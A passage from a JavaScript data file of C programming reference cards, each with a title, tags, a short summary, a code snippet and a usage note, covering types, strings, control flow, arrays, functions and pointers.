    title: "restrict",
    cat: "Types",
    tags: ["restrict", "qualifier", "aliasing", "optimization", "pointer", "c99"],
    aka: "what does restrict mean in c",
    sum: "A promise that a pointer is the only way the pointed-to data is accessed in that scope.",
    code: c`void add_arrays(size_t n,
                int *restrict dst,
                const int *restrict a,
                const int *restrict b) {
    for (size_t i = 0; i < n; i++) {
        dst[i] = a[i] + b[i];
    }
}`,
    note: "Breaking the promise is undefined behavior. It helps vectorization; omit it if the arrays may overlap.",
    pop: 3,
  },
  {
    title: "Complex numbers",
    cat: "Types",
    tags: ["complex", "imaginary", "c99", "math", "real", "phase", "i"],
    aka: "how to use complex numbers in c",
    sum: "C99 adds float/double complex types and arithmetic.",
    code: c`#include <complex.h>

double complex z = 3.0 + 4.0 * I;
double complex w = conj(z);
double mag = cabs(z);        // 5.0
double phase = carg(z);
double re = creal(z);
double im = cimag(z);

printf("%.1f%+.1fi\n", re, im);`,
    note: "Link with -lm. Do not compare complex values for exact equality.",
    pop: 2,
  },
  {
    title: "_Generic selection",
    cat: "Types",
    tags: ["generic", "type", "dispatch", "macro", "c11", "overload", "typeof"],
    aka: "how to simulate function overloading in c",
    sum: "Choose an expression based on the compile-time type of another expression.",
    code: c`#define type_name(x) _Generic((x), \
    int: "int", \
    long: "long", \
    double: "double", \
    char *: "char *", \
    const char *: "const char *", \
    default: "other")

puts(type_name(42));       // int
puts(type_name(3.14));     // double`,
    note: "C11 feature with no runtime cost. Arrays and functions decay before matching, which can surprise you.",
    pop: 3,
  },
  {
    title: "_Static_assert",
    cat: "Types",
    tags: ["static_assert", "assert", "compile", "time", "check", "c11", "size"],
    aka: "how to check a condition at compile time",
    sum: "Fail the build if a constant expression is false.",
    code: c`#include <assert.h>

_Static_assert(sizeof(int) == 4, "need 32-bit int");
static_assert(sizeof(void *) == 8, "need 64-bit pointers"); // C23 keyword

struct Header {
    int type;
    int length;
};
_Static_assert(sizeof(struct Header) == 8, "unexpected padding");`,
    note: "Checked by the compiler with no runtime cost. C11 uses _Static_assert from assert.h; C23 makes static_assert a keyword.",
    pop: 3,
  },
  {
    title: "alignof and alignas",
    cat: "Types",
    tags: ["align", "alignment", "alignof", "alignas", "memory", "simd", "c11"],
    aka: "how to align a struct or array in memory",
    sum: "alignof reports the required alignment; alignas raises it for an object or type.",
    code: c`#include <stdalign.h>
#include <stdio.h>

struct S { char c; int i; };

printf("%zu\n", alignof(struct S));   // likely 4
printf("%zu\n", sizeof(struct S));    // likely 8

alignas(32) float simd[8];            // 32-byte aligned`,
    note: "Alignment must be a power of two and at least the natural alignment. C23 makes alignof/alignas keywords.",
    pop: 3,
  },
  {
    title: "intmax_t and PRI macros",
    cat: "Types",
    tags: ["intmax", "uintmax", "inttypes", "format", "portable", "printf", "stdint"],
    aka: "how to print int64_t portably",
    sum: "inttypes.h provides the widest integer types and matching printf macros.",
    code: c`#include <inttypes.h>
#include <stdint.h>

int64_t big = INT64_MAX;
uint64_t ubig = UINT64_MAX;
printf("%" PRId64 "\n", big);
printf("%" PRIu64 "\n", ubig);

intmax_t m = INTMAX_MAX;
printf("%" PRIdMAX "\n", m);`,
    note: "The macros expand to strings like \"ld\" or \"lld\". Adjacent string literals join, so no + is needed.",
    pop: 3,
  },
  {
    title: "Floating-point precision",
    cat: "Types",
    tags: ["float", "double", "precision", "epsilon", "mantissa", "rounding", "accuracy", "float.h"],
    aka: "how many digits can a float hold why is my float inaccurate",
    sum: "float has about 7 significant digits, double about 15. Neither stores most decimals exactly.",
    code: c`#include <float.h>
#include <stdio.h>

printf("%d\n", FLT_DIG);     // 6
printf("%d\n", DBL_DIG);     // 15
printf("%.17g\n", 0.1);      // 0.10000000000000001

if (fabs(a - b) <= 1e-9) {
    // close enough
}`,
    note: "Use double by default, long double only when needed. For money, store integer cents instead.",
    pop: 6,
  },
  {
    title: "Bit flags with an enum",
    cat: "Types",
    tags: ["flags", "bitmask", "enum", "bits", "permissions", "options", "mask"],
    aka: "how to store multiple boolean options in one integer",
    sum: "Give each flag its own bit, then combine them with OR.",
    code: c`enum Perm {
    PERM_READ  = 1 << 0,
    PERM_WRITE = 1 << 1,
    PERM_EXEC  = 1 << 2,
};

unsigned perms = PERM_READ | PERM_WRITE;

if (perms & PERM_WRITE) {
    puts("writable");
}

perms &= ~PERM_WRITE;   // clear
perms ^= PERM_EXEC;     // toggle`,
    note: "Use unsigned for flag sets. Keep masks in one enum so values do not collide.",
    pop: 5,
  },
  {
    title: "long double",
    cat: "Types",
    tags: ["long", "double", "precision", "extended", "80bit", "float"],
    aka: "what is long double used for",
    sum: "At least as much precision as double, sometimes 80-bit or 128-bit.",
    code: c`long double x = 1.0L / 3.0L;
printf("%.21Lf\n", x);
printf("%zu bytes\n", sizeof(long double));

long double y = sqrtl(2.0L);`,
    note: "On x86-64 Linux it is usually 80-bit (16 bytes); on ARM it may equal double. Use the L suffix and %Lf.",
    pop: 2,
  },
  {
    title: "auto type inference",
    cat: "Types",
    tags: ["auto", "inference", "c23", "type", "deduce", "declare"],
    aka: "does c have auto type inference",
    sum: "C23 lets auto take the type of its initializer. Before C23, auto was a useless storage class.",
    code: c`auto x = 42;        // int
auto y = 3.14;      // double
auto p = &x;        // int *

auto copy = x;      // int`,
    note: "Requires C23 (-std=c23 or -std=c2x). There is no reference/pointer inference magic like C++ auto&.",
    pop: 3,
  },
  {
    title: "typeof",
    cat: "Types",
    tags: ["typeof", "type", "c23", "gnu", "extension", "generic", "deduce"],
    aka: "how to get the type of an expression",
    sum: "typeof(expr) names the type of an expression. Standard in C23; a GNU extension for decades.",
    code: c`int x = 1;
typeof(x) y = 2;          // int
typeof(int *) p = &x;     // int *
typeof(x) *q = &x;        // int *

#define MAX(a, b) ({ \
    typeof(a) _a = (a); \
    typeof(b) _b = (b); \
    _a > _b ? _a : _b; \
})`,
    note: "The statement-expression trick is a GNU extension, not ISO C. Use typeof_unqual to drop qualifiers in C23.",
    pop: 3,
  },
  {
    title: "Byte order (endianness)",
    cat: "Types",
    tags: ["endian", "endianness", "byte", "order", "little", "big", "network", "binary"],
    aka: "how to check if my machine is little endian",
    sum: "Multi-byte values can be stored least-significant byte first or last.",
    code: c`#include <stdint.h>
#include <arpa/inet.h>   // POSIX htonl

uint32_t x = 0x01020304;
unsigned char *p = (unsigned char *)&x;

if (p[0] == 0x04) puts("little-endian");
else if (p[0] == 0x01) puts("big-endian");

// network byte order is big-endian:
uint32_t net = htonl(x);   // POSIX sockets`,
    note: "Do not write raw structs to files or sockets and expect portability. Encode fields explicitly or use htonl/ntohl.",
    pop: 4,
  },

  {
    title: "memcpy, memmove, and memcmp",
    cat: "Strings",
    tags: ["memcpy", "memmove", "memcmp", "memory", "copy", "overlap", "compare", "bytes"],
    aka: "difference between memcpy and memmove",
    sum: "Copy raw bytes with memcpy, overlapping bytes with memmove, and compare with memcmp.",
    code: c`#include <string.h>

memcpy(dst, src, n);          // n bytes, must not overlap
memmove(dst, src, n);         // overlap is safe

int cmp = memcmp(a, b, n);    // <0, 0, or >0

// for strings, include the NUL:
memcpy(dst, src, strlen(src) + 1);`,
    note: "n is a byte count, not an element count. memcmp is not a numeric comparison.",
    pop: 6,
  },
  {
    title: "Split with strtok_r",
    cat: "Strings",
    tags: ["strtok_r", "strtok", "split", "token", "delimiter", "reentrant", "parse"],
    aka: "thread safe version of strtok",
    sum: "strtok_r keeps its state in a pointer you own, so nested or threaded parsing works.",
    code: c`char line[] = "red,green,blue";
char *save = NULL;

for (char *tok = strtok_r(line, ",", &save);
     tok != NULL;
     tok = strtok_r(NULL, ",", &save)) {
    puts(tok);
}`,
    note: "POSIX, not ISO C. It modifies the input by writing NULs. strtok uses hidden global state and is not reentrant.",
    pop: 4,
  },
  {
    title: "Duplicate a string",
    cat: "Strings",
    tags: ["strdup", "duplicate", "copy", "allocate", "string", "heap", "clone"],
    aka: "how to copy a string to the heap",
    sum: "strdup allocates and copies; free the result when done.",
    code: c`#include <string.h>
#include <stdlib.h>

char *copy = strdup(original);
if (!copy) {
    perror("strdup");
    return 1;
}
// ...
free(copy);`,
    note: "POSIX and C23; not available in older ISO C. Portable equivalent: malloc(strlen(s)+1) then strcpy.",
    pop: 6,
  },
  {
    title: "Case-insensitive compare",
    cat: "Strings",
    tags: ["strcasecmp", "strncasecmp", "case", "insensitive", "compare", "ignore", "strings"],
    aka: "how to compare strings ignoring case",
    sum: "strcasecmp compares without regard to case. It is POSIX, not ISO C.",
    code: c`#include <strings.h>

if (strcasecmp(a, b) == 0) {
    puts("same, ignoring case");
}

if (strncasecmp(a, b, n) == 0) {
    // first n bytes match
}`,
    note: "On Windows use _stricmp. ISO C only has strcmp, so portable code needs tolower per character.",
    pop: 4,
  },
  {
    title: "Parse with sscanf",
    cat: "Strings",
    tags: ["sscanf", "parse", "format", "string", "extract", "scan", "input"],
    aka: "how to parse a string into variables",
    sum: "sscanf reads formatted values from a string and returns how many it matched.",
    code: c`int year, month, day;

if (sscanf("2026-11-17", "%d-%d-%d", &year, &month, &day) == 3) {
    printf("%04d-%02d-%02d\n", year, month, day);
}

char word[32];
if (sscanf("hello 42", "%31s", word) == 1) {
    puts(word);
}`,
    note: "%s stops at whitespace, not at punctuation. Always give width limits and check the return count.",
    pop: 5,
  },
  {
    title: "printf width and precision",
    cat: "Strings",
    tags: ["printf", "width", "precision", "format", "padding", "align", "decimal", "output"],
    aka: "how to pad or align printf output",
    sum: "Width is the minimum field size; precision limits digits after the point or characters printed.",
    code: c`printf("[%5d]\n", 42);      // [   42]
printf("[%-5d]\n", 42);     // [42   ]
printf("[%05d]\n", 42);     // [00042]

printf("[%.3f]\n", 3.14159); // [3.142]
printf("[%8.2f]\n", 3.14159); // [    3.14]

printf("[%10s]\n", "hi");    // [        hi]
printf("[%.4s]\n", "hello"); // [hell]`,
    note: "Use * to take width or precision from an argument: printf(\"%*d\", width, value).",
    pop: 6,
  },
  {
    title: "Read a line with getline",
    cat: "Strings",
    tags: ["getline", "line", "read", "allocate", "posix", "stdin", "dynamic"],
    aka: "how to read an arbitrarily long line",
    sum: "getline allocates or grows a buffer to fit the whole line, including the newline.",
    code: c`#include <stdio.h>
#include <stdlib.h>

char *line = NULL;
size_t cap = 0;

while (getline(&line, &cap, stdin) != -1) {
    fputs(line, stdout);
}

free(line);`,
    note: "POSIX, not ISO C. Returns the length or -1; you own the buffer and must free it.",
    pop: 4,
  },
  {
    title: "puts and putchar",
    cat: "Strings",
    tags: ["puts", "putchar", "fputs", "output", "print", "character", "write"],
    aka: "how to print a string or character",
    sum: "puts writes a string plus a newline; putchar writes one character.",
    code: c`puts("hello");        // hello\n
putchar('A');
putchar('\n');

fputs("no newline", stdout);
fputc('!', stdout);`,
    note: "puts adds a newline; fputs does not. Both return EOF on failure.",
    pop: 5,
  },
  {
    title: "Strip the newline from fgets",
    cat: "Strings",
    tags: ["fgets", "newline", "strip", "trim", "line", "input", "crlf"],
    aka: "why does my string have a newline at the end",
    sum: "fgets keeps the newline if it fits; remove it before comparing or parsing.",
    code: c`if (fgets(line, sizeof line, stdin)) {
    size_t len = strlen(line);
    if (len && line[len - 1] == '\n') {
        line[--len] = '\0';
    }
    if (len && line[len - 1] == '\r') {
        line[--len] = '\0';   // CRLF input
    }
}`,
    note: "If the line did not fit, no newline is present. Check whether the buffer was filled.",
    pop: 7,
  },
  {
    title: "Trim whitespace",
    cat: "Strings",
    tags: ["trim", "whitespace", "strip", "space", "leading", "trailing", "clean"],
    aka: "how to remove spaces from the start and end of a string",
    sum: "Advance past leading spaces, then shorten from the end.",
    code: c`#include <ctype.h>
#include <string.h>

char *trim(char *s) {
    while (isspace((unsigned char)*s)) s++;

    char *end = s + strlen(s);
    while (end > s && isspace((unsigned char)end[-1])) {
        *--end = '\0';
    }
    return s;
}`,
    note: "Returns a pointer inside the original buffer. Cast to unsigned char before calling ctype functions.",
    pop: 5,
  },
  {
    title: "Reverse a string",
    cat: "Strings",
    tags: ["reverse", "string", "in", "place", "swap", "characters"],
    aka: "how to reverse a string in place",
    sum: "Swap characters from both ends until they meet.",
    code: c`void reverse(char *s) {
    size_t n = strlen(s);
    for (size_t i = 0; i < n / 2; i++) {
        char tmp = s[i];
        s[i] = s[n - 1 - i];
        s[n - 1 - i] = tmp;
    }
}`,
    note: "The buffer must be writable. A string literal is read-only and will crash.",
    pop: 4,
  },
  {
    title: "Concatenate string literals",
    cat: "Strings",
    tags: ["concat", "literal", "adjacent", "join", "compile", "multiline", "string"],
    aka: "how to split a long string over multiple lines",
    sum: "Adjacent string literals are joined by the compiler.",
    code: c`const char *msg =
    "This is a long message "
    "split across several lines "
    "without runtime concatenation.";

printf("%s\n", msg);`,
    note: "Only works for literals, not variables. Use strcat or snprintf for runtime strings.",
  },
  {
    title: "UTF-8 strings",
    cat: "Strings",
    tags: ["utf8", "unicode", "utf-8", "encoding", "multibyte", "char", "bytes"],
    aka: "how to handle unicode in c",
    sum: "UTF-8 is stored in ordinary char arrays; one character may take several bytes.",
    code: c`// the source file itself is UTF-8:
const char *s = "héllo";

size_t bytes = strlen(s);   // 6 bytes, 5 characters
for (size_t i = 0; i < bytes; i++) {
    printf("%02x ", (unsigned char)s[i]);
}

// C11 also has char16_t and char32_t:
char32_t cp = U'é';`,
    note: "strlen counts bytes, not characters. u8\"\" literals are char[] before C23 and char8_t[] in C23. Use a Unicode library for real text handling.",
    pop: 5,
  },
  {
    title: "Wide strings",
    cat: "Strings",
    tags: ["wide", "wchar", "wchar_t", "unicode", "wprintf", "wcslen", "locale"],
    aka: "what is wchar_t and wide string",
    sum: "wchar_t strings use one wide code unit per element, with wcs* functions.",
    code: c`#include <locale.h>
#include <wchar.h>

setlocale(LC_ALL, "");

wchar_t ws[] = L"héllo";
wprintf(L"%ls\n", ws);
printf("%zu units\n", wcslen(ws));`,
    note: "wchar_t is 16-bit on Windows and usually 32-bit on Linux. Set the locale before wide I/O.",
    pop: 3,
  },
  {
    title: "strspn and strcspn",
    cat: "Strings",
    tags: ["strspn", "strcspn", "span", "prefix", "scan", "delimiter", "parse"],
    aka: "how to find the first character not in a set",
    sum: "strspn counts leading characters in a set; strcspn counts until a character in a set.",
    code: c`const char *s = "   hello, world";

size_t lead = strspn(s, " \t");      // 3
size_t word = strcspn(s, " ,");      // 5 (until space or comma)

printf("%zu %zu\n", lead, word);

// skip whitespace:
s += strspn(s, " \t\n");`,
    note: "Handy for hand-written parsers. Both stop at the NUL terminator.",
    pop: 3,
  },
  {
    title: "strerror and errno",
    cat: "Strings",
    tags: ["strerror", "errno", "error", "message", "perror", "failure", "diagnostic"],
    aka: "how to print a system error message",
    sum: "Check errno after a failed call, then turn it into a message.",
    code: c`#include <errno.h>
#include <string.h>

FILE *fp = fopen("missing.txt", "r");
if (!fp) {
    fprintf(stderr, "fopen: %s\n", strerror(errno));
}

// or in one call:
if (!fp) perror("fopen");`,
    note: "errno is only meaningful right after a failure, and only if the function documents it. strerror is not thread-safe.",
    pop: 5,
  },

  {
    title: "Switch fallthrough",
    cat: "Control",
    tags: ["switch", "fallthrough", "case", "break", "fall", "through", "warning"],
    aka: "why does my switch run the next case",
    sum: "Without break, execution continues into the next case.",
    code: c`switch (ch) {
case 'a':
case 'b':
    puts("a or b");
    break;

case 'c':
    puts("c");
    // fall through on purpose

case 'd':
    puts("c or d");
    break;

default:
    break;
}`,
    note: "Add /* fall through */ for intentional cases. GCC warns with -Wimplicit-fallthrough.",
    pop: 5,
  },
  {
    title: "Break out of nested loops",
    cat: "Control",
    tags: ["break", "nested", "loop", "exit", "goto", "flag", "outer"],
    aka: "how to break out of two loops at once",
    sum: "break only exits the innermost loop; use a flag or goto for more.",
    code: c`// flag version:
int found = 0;
for (int i = 0; i < rows && !found; i++) {
    for (int j = 0; j < cols; j++) {
        if (grid[i][j] == target) {
            found = 1;
            break;
        }
    }
}

// goto version:
for (int i = 0; i < rows; i++) {
    for (int j = 0; j < cols; j++) {
        if (grid[i][j] == target) goto done;
    }
}
done:`,
    note: "A flag is usually clearer. If you need cleanup too, goto a single cleanup label.",
    pop: 4,
  },
  {
    title: "Loop with multiple counters",
    cat: "Control",
    tags: ["for", "multiple", "counters", "comma", "two", "variables", "loop"],
    aka: "can a for loop have two variables",
    sum: "Declare counters of the same type with commas and update both in the third clause.",
    code: c`for (int i = 0, j = n - 1; i < j; i++, j--) {
    int tmp = a[i];
    a[i] = a[j];
    a[j] = tmp;
}`,
    note: "Both variables must have the same type in one declaration. You can also leave any for clause empty.",
    pop: 4,
  },
  {
    title: "Early return",
    cat: "Control",
    tags: ["early", "return", "guard", "clause", "nesting", "cleanup", "function"],
    aka: "should i return early or use else",
    sum: "Check invalid cases first and return; keep the main path unindented.",
    code: c`int process(const char *path) {
    if (path == NULL) return -1;

    FILE *fp = fopen(path, "r");
    if (!fp) return -1;

    int rc = work(fp);
    fclose(fp);
    return rc;
}`,
    note: "If every path needs the same cleanup, a single goto cleanup label is often clearer.",
    pop: 5,
  },
  {
    title: "Read until EOF",
    cat: "Control",
    tags: ["scanf", "eof", "read", "loop", "input", "until", "stdin", "while"],
    aka: "how to read numbers until end of file",
    sum: "Loop while scanf returns the expected number of items.",
    code: c`int value;
long sum = 0;

while (scanf("%d", &value) == 1) {
    sum += value;
}

if (!feof(stdin)) {
    fprintf(stderr, "bad input\n");
}
printf("%ld\n", sum);`,
    note: "scanf returns the number of items matched, or EOF. Always check it instead of looping forever.",
    pop: 5,
  },
  {
    title: "setjmp and longjmp",
    cat: "Control",
    tags: ["setjmp", "longjmp", "jump", "exception", "error", "nonlocal", "recover"],
    aka: "how to do non local jumps or exceptions in c",
    sum: "Save a point with setjmp, then jump back to it from deep inside a call.",
    code: c`#include <setjmp.h>
#include <stdio.h>

jmp_buf env;

void might_fail(int bad) {
    if (bad) longjmp(env, 1);
}

int main(void) {
    if (setjmp(env) == 0) {
        might_fail(1);
        puts("not reached");
    } else {
        puts("recovered");
    }
    return 0;
}`,
    note: "Skips normal cleanup and is easy to misuse. Local variables changed after setjmp may be indeterminate; use volatile or restructure.",
    pop: 4,
  },
  {
    title: "Braces and the dangling else",
    cat: "Control",
    tags: ["if", "else", "braces", "dangling", "indentation", "warning", "block"],
    aka: "why does my else attach to the wrong if",
    sum: "An else binds to the nearest unmatched if. Always brace multi-line branches.",
    code: c`if (a)
    if (b)
        puts("a and b");
    else
        puts("not b");   // binds to the inner if!

// clearer:
if (a) {
    if (b) {
        puts("a and b");
    } else {
        puts("not b");
    }
}`,
    note: "GCC's -Wmisleading-indentation catches this pattern. Braces also make later edits safer.",
    pop: 4,
  },

  {
    title: "Array of pointers vs pointer to an array",
    cat: "Arrays",
    tags: ["array", "pointers", "pointer", "to", "array", "declaration", "rows", "2d"],
    aka: "difference between int *a[3] and int (*a)[3]",
    sum: "int *a[3] is an array of three pointers; int (*a)[3] points to one three-element array.",
    code: c`int *a[3];      // array of 3 int pointers
int (*b)[3];    // pointer to an array of 3 ints

int m[2][3];
b = m;          // points at the first row

printf("%zu\n", sizeof a);   // 3 pointers
printf("%zu\n", sizeof *b);  // 3 ints`,
    note: "Read declarations right to left around the name. b + 1 skips a whole row.",
    pop: 5,
  },
  {
    title: "Pass a 2D array to a function",
    cat: "Arrays",
    tags: ["2d", "array", "function", "pass", "matrix", "parameter", "rows", "cols"],
    aka: "how to pass a two dimensional array to a function",
    sum: "The column count must be part of the parameter type.",
    code: c`void print(int rows, int cols, int a[rows][cols]) {
    for (int r = 0; r < rows; r++) {
        for (int c = 0; c < cols; c++) {
            printf("%d ", a[r][c]);
        }
        putchar('\n');
    }
}

// fixed-width alternative:
void fill(int a[][3], int rows) {
    for (int r = 0; r < rows; r++)
        for (int c = 0; c < 3; c++)
            a[r][c] = 0;
}`,
    note: "The first dimension is ignored. The compiler needs the row width to compute a[r][c].",
    pop: 5,
  },
  {
    title: "Variable-length array",
    cat: "Arrays",
    tags: ["vla", "variable", "length", "array", "runtime", "stack", "c99"],
    aka: "can i create an array with a runtime size",
    sum: "C99 allows local arrays whose size is a runtime value.",
    code: c`void process(int n) {
    int a[n];              // VLA, size fixed at entry
    size_t bytes = sizeof a; // evaluated at runtime

    for (int i = 0; i < n; i++) a[i] = i;
}`,
    note: "Allocated on the stack, no failure check. Large or hostile n can overflow the stack. Optional in C11/C17; absent from C++.",
    pop: 4,
  },
  {
    title: "Compound literals",
    cat: "Arrays",
    tags: ["compound", "literal", "temporary", "struct", "array", "initializer", "anonymous"],
    aka: "how to pass a temporary struct or array",
    sum: "Create an unnamed object with a cast-like initializer.",
    code: c`struct Point { int x, y; };

void draw(struct Point p);

draw((struct Point){ .x = 1, .y = 2 });
draw((struct Point){ 3, 4 });

int *nums = (int[]){ 1, 2, 3, 4 };`,
    note: "The unnamed object lives until the end of the enclosing block. Taking its address is fine within that scope.",
    pop: 4,
  },
  {
    title: "Designated initializers",
    cat: "Arrays",
    tags: ["designated", "initializer", "array", "struct", "fields", "c99", "init"],
    aka: "how to initialize only some fields of a struct",
    sum: "Name the index or member you want to set; everything else becomes zero.",
    code: c`int a[6] = { [0] = 1, [3] = 4, [5] = 6 };

struct Config cfg = {
    .verbose = 1,
    .retries = 3,
};

struct Point p = { .y = 2, .x = 1 };`,
    note: "C99. Unlisted members are zero-initialized. Order does not matter, but later duplicates win.",
    pop: 6,
  },
  {
    title: "Zero an array",
    cat: "Arrays",
    tags: ["zero", "clear", "array", "memset", "initialize", "reset"],
    aka: "how to set every element of an array to zero",
    sum: "Use an initializer for a new array, memset for an existing one.",
    code: c`int a[100] = {0};            // all zero
char buf[256] = {0};

memset(b, 0, sizeof b);      // existing array

int *p = calloc(n, sizeof *p); // heap, zeroed`,
    note: "All-bits-zero is 0 for integers, but not necessarily 0.0 for floating point or NULL on exotic machines.",
    pop: 7,
  },
  {
    title: "Reverse an array",
    cat: "Arrays",
    tags: ["reverse", "array", "swap", "in", "place", "flip"],
    aka: "how to reverse an array in c",
    sum: "Swap the first and last elements, then move inward.",
    code: c`void reverse(int *a, size_t n) {
    for (size_t i = 0; i < n / 2; i++) {
        int tmp = a[i];
        a[i] = a[n - 1 - i];
        a[n - 1 - i] = tmp;
    }
}`,
    note: "Works in place with O(1) extra memory. n is the element count, not the byte size.",
    pop: 4,
  },
  {
    title: "Shuffle an array",
    cat: "Arrays",
    tags: ["shuffle", "random", "fisher", "yates", "array", "deck", "cards"],
    aka: "how to randomly shuffle an array",
    sum: "Fisher–Yates: for each position from the end, swap with a random earlier index.",
    code: c`#include <stdlib.h>

void shuffle(int *a, size_t n) {
    for (size_t i = n; i > 1; i--) {
        size_t j = (size_t)rand() % i;
        int tmp = a[i - 1];
        a[i - 1] = a[j];
        a[j] = tmp;
    }
}`,
    note: "Seed rand once. Modulo introduces slight bias; use a better PRNG for simulations.",
    pop: 4,
  },
  {
    title: "Find max and min",
    cat: "Arrays",
    tags: ["max", "min", "maximum", "minimum", "array", "largest", "smallest"],
    aka: "how to find the largest element in an array",
    sum: "Start with the first element, then scan once.",
    code: c`int max = a[0];
int min = a[0];

for (size_t i = 1; i < n; i++) {
    if (a[i] > max) max = a[i];
    if (a[i] < min) min = a[i];
}`,
    note: "Only valid when n > 0. For an empty array, return an error or use a sentinel.",
    pop: 5,
  },
  {
    title: "Binary search with bsearch",
    cat: "Arrays",
    tags: ["binary", "search", "bsearch", "sorted", "array", "find", "log"],
    aka: "how to search a sorted array",
    sum: "bsearch finds an element in a sorted array in O(log n).",
    code: c`#include <stdlib.h>

int cmp_int(const void *a, const void *b) {
    int x = *(const int *)a;
    int y = *(const int *)b;
    return (x > y) - (x < y);
}

int key = 42;
int *hit = bsearch(&key, a, n, sizeof a[0], cmp_int);
if (hit) {
    printf("found at index %td\n", hit - a);
}`,
    note: "The array must already be sorted with the same ordering. bsearch returns NULL when absent.",
    pop: 4,
  },
  {
    title: "Compare arrays",
    cat: "Arrays",
    tags: ["compare", "array", "equal", "memcmp", "same", "difference"],
    aka: "how to check if two arrays are equal",
    sum: "Compare the lengths, then compare the bytes with memcmp.",
    code: c`if (n == m && memcmp(a, b, n * sizeof a[0]) == 0) {
    puts("equal");
}`,
    note: "memcmp compares object representations. Struct padding and floating-point -0.0/NaN can break intuitive equality.",
    pop: 4,
  },

  {
    title: "Return multiple values",
    cat: "Functions",
    tags: ["return", "multiple", "values", "output", "pointer", "struct", "tuple"],
    aka: "how to return two values from a function",
    sum: "C returns one value: use output pointers or return a struct.",
    code: c`void divmod(int a, int b, int *q, int *r) {
    *q = a / b;
    *r = a % b;
}

struct Result { int q, r; };
struct Result divmod2(int a, int b) {
    return (struct Result){ a / b, a % b };
}`,
    note: "Output pointers let you report success separately. Returning a small struct is often cleaner.",
    pop: 5,
  },
  {
    title: "Variadic functions",
    cat: "Functions",
    tags: ["variadic", "varargs", "va_list", "va_start", "va_arg", "printf", "arguments"],
    aka: "how to write a function with a variable number of arguments",
    sum: "Use stdarg.h and a count or format string to know how many arguments to read.",
    code: c`#include <stdarg.h>

int sum(int count, ...) {
    va_list ap;
    va_start(ap, count);

    int total = 0;
    for (int i = 0; i < count; i++) {
        total += va_arg(ap, int);
    }

    va_end(ap);
    return total;
}

int s = sum(3, 10, 20, 30);`,
    note: "There is no type or count checking. Never pass float or char where va_arg expects double or int.",
    pop: 4,
  },
  {
    title: "Callback with a function pointer",
    cat: "Functions",
    tags: ["callback", "function", "pointer", "higher", "order", "apply", "qsort"],
    aka: "how to pass a function to another function",
    sum: "Accept a function pointer, then call it like a function.",
    code: c`void each(int *a, size_t n, void (*fn)(int)) {
    for (size_t i = 0; i < n; i++) {
        fn(a[i]);
    }
}

void print_int(int x) { printf("%d\n", x); }

each(values, n, print_int);`,
    note: "The callback's signature must match exactly. A function name decays to a pointer automatically.",
    pop: 5,
  },
  {
    title: "Array of function pointers",
    cat: "Functions",
    tags: ["array", "function", "pointer", "dispatch", "table", "menu", "command"],
    aka: "how to make a dispatch table",
    sum: "Store functions with the same signature in an array and index into it.",
    code: c`int add(int a, int b) { return a + b; }
int sub(int a, int b) { return a - b; }

int (*ops[])(int, int) = { add, sub };

printf("%d\n", ops[0](7, 2));   // 9
printf("%d\n", ops[1](7, 2));   // 5`,
    note: "All functions must share the return type and parameter types. Bounds-check the index.",
    pop: 4,
  },
  {
    title: "typedef a function pointer",
    cat: "Functions",
    tags: ["typedef", "function", "pointer", "alias", "readable", "callback"],
    aka: "how to make a function pointer type",
    sum: "A typedef turns the pointer into an ordinary type name.",
    code: c`typedef int (*binop)(int, int);

int add(int a, int b) { return a + b; }

binop op = add;
printf("%d\n", op(1, 2));

void apply(binop fn, int x, int y) {
    printf("%d\n", fn(x, y));
}`,
    note: "The typedef names the pointer type, so no extra * is needed: binop op, not binop *op.",
    pop: 4,
  },
  {
    title: "inline functions",
    cat: "Functions",
    tags: ["inline", "optimize", "header", "static", "function", "c99"],
    aka: "how to use inline in c",
    sum: "inline suggests expanding the function at the call site. Use static inline in headers.",
    code: c`// in a header:
static inline int square(int x) {
    return x * x;
}

// in a .c file:
inline int cube(int x) { return x * x * x; }
extern int cube(int x);   // provides an external definition`,
    note: "inline is a hint, not a guarantee. C99 inline rules differ from C++; static inline is the simple portable choice.",
    pop: 4,
  },
  {
    title: "noreturn functions",
    cat: "Functions",
    tags: ["noreturn", "never", "returns", "exit", "abort", "function", "c11"],
    aka: "how to mark a function that never returns",
    sum: "Tell the compiler the function always exits or aborts.",
    code: c`#include <stdnoreturn.h>
#include <stdlib.h>

noreturn void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

// C23:
[[noreturn]] void panic(void);`,
    note: "If a noreturn function does return, behavior is undefined. C11 uses _Noreturn/stdnoreturn.h.",
    pop: 3,
  },
  {
    title: "exit vs return",
    cat: "Functions",
    tags: ["exit", "return", "main", "terminate", "status", "cleanup", "atexit"],
    aka: "difference between exit and return from main",
    sum: "return from main and exit() both end the program and flush streams; returning from another function does not.",
    code: c`#include <stdlib.h>

void fail(void) {
    exit(EXIT_FAILURE);   // ends the whole program
}

int main(void) {
    fail();
    return 0;             // not reached
}`,
    note: "exit runs atexit handlers and flushes stdio. abort and _Exit skip normal cleanup.",
    pop: 5,
  },
  {
    title: "atexit handlers",
    cat: "Functions",
    tags: ["atexit", "cleanup", "exit", "handler", "shutdown", "register"],
    aka: "how to run cleanup code when the program exits",
    sum: "Register functions to run on normal termination, in reverse order.",
    code: c`#include <stdio.h>
#include <stdlib.h>

void close_log(void) { puts("closing log"); }

int main(void) {
    if (atexit(close_log) != 0) {
        return 1;
    }
    return 0;
}`,
    note: "Runs on return from main or exit(), not on abort() or _Exit(). Handlers take no arguments and cannot report errors usefully.",
    pop: 3,
  },
  {
    title: "assert",
    cat: "Functions",
    tags: ["assert", "check", "debug", "invariant", "abort", "ndebug"],
    aka: "how to assert a condition while debugging",
    sum: "assert aborts with a diagnostic if the condition is false.",
    code: c`#include <assert.h>

assert(p != NULL);
assert(count > 0);

// disabled by compiling with -DNDEBUG:
// gcc -DNDEBUG main.c`,
    note: "Never put side effects inside assert: they disappear under NDEBUG. Use it for programmer errors, not user input.",
    pop: 5,
  },

  {
    title: "Pointer to an array",
    cat: "Pointers",
    tags: ["pointer", "to", "array", "row", "2d", "sizeof", "type"],
    aka: "what is a pointer to an array",
    sum: "A pointer to an array steps by whole arrays, not single elements.",
    code: c`int a[5] = {0};

int (*p)[5] = &a;      // pointer to the whole array
printf("%zu\n", sizeof *p);   // 5 * sizeof(int)

int m[3][4];
int (*row)[4] = m;     // points to the first row
row++;                 // now the second row`,
    note: "&a has type int (*)[5]; a decays to int *. The values are the same, the types are not.",
    pop: 4,
  },
  {
    title: "Array of pointers",
    cat: "Pointers",
    tags: ["array", "pointers", "strings", "lookup", "table", "argv"],
    aka: "how to make an array of pointers",
